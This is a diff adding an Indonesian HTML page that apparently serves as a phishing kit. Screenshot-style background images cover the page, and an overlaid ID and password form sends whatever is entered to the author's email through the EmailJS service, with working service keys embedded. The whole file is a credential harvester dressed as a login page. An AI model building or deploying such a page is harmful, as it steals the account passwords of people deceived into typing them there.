@@ -1,0 +1,103 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Login Kirim ke Email</title>
+    <style>
+        body {{
+            margin: 0;
+            padding: 0;
+            font-family: sans-serif;
+        }}
+        .page {{
+            display: none;
+            height: 100vh;
+            width: 100vw;
+            background-size: cover;
+            background-position: center;
+            position: relative;
+        }}
+        .active {{
+            display: block;
+        }}
+        .button {{
+            position: absolute;
+            padding: 10px 20px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+        }}
+        #btn-next {{
+            left: 20px;
+            bottom: 20px;
+        }}
+        #btn-back {{
+            left: 20px;
+            bottom: 20px;
+        }}
+        form {{
+            position: absolute;
+            top: 30%;
+            left: 10%;
+            background: rgba(255,255,255,0.8);
+            padding: 20px;
+            border-radius: 10px;
+        }}
+        input {{
+            display: block;
+            margin-bottom: 10px;
+            padding: 8px;
+            width: 200px;
+        }}
+    </style>
+</head>
+<body>
+    <div id="page1" class="page active" style="background-image: url('page1.jpg');">
+        <button class="button" id="btn-next" onclick="showPage('page2')">Akun</button>
+    </div>
+    <div id="page2" class="page" style="background-image: url('page2.jpg');">
+        <button class="button" id="btn-back" onclick="showPage('page1')">Kembali</button>
+
+        <form id="login-form">
+            <label for="user_id">ID:</label>
+            <input type="text" id="user_id" name="user_id" required>
+
+            <label for="password">Kata Sandi:</label>
+            <input type="password" id="password" name="password" required>
+
+            <button type="submit">Kirim</button>
+        </form>
+    </div>
+
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+    <script>
+        (function(){{
+            emailjs.init("ymj28Qa8NKcPxSHwj");
+        }})();
+
+        document.getElementById("login-form").addEventListener("submit", function(event) {{
+            event.preventDefault();
+            emailjs.send("service_wyfh9xg", "template_b8comjf", {{
+                user_id: document.getElementById("user_id").value,
+                password: document.getElementById("password").value
+            }}).then(function(response) {{
+                alert("Data berhasil dikirim!");
+                document.getElementById("login-form").reset();
+            }}, function(error) {{
+                alert("Gagal mengirim: " + JSON.stringify(error));
+            }});
+        }});
+
+        function showPage(id) {{
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById(id).classList.add('active');
+        }}
+    </script>
+</body>
+</html>
